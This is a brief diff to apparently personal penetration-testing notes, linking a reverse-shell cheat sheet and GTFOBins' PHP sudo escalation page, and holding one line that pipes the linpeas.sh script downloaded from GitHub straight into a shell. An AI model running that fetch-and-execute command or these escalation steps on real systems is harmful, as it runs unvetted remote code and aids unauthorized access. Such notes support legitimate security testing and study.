@@ -38,3 +38,5 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 
 -------------escalate script
 \\curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+--------------------- PHP GTFOBins
+https://gtfobins.github.io/gtfobins/php/#sudo
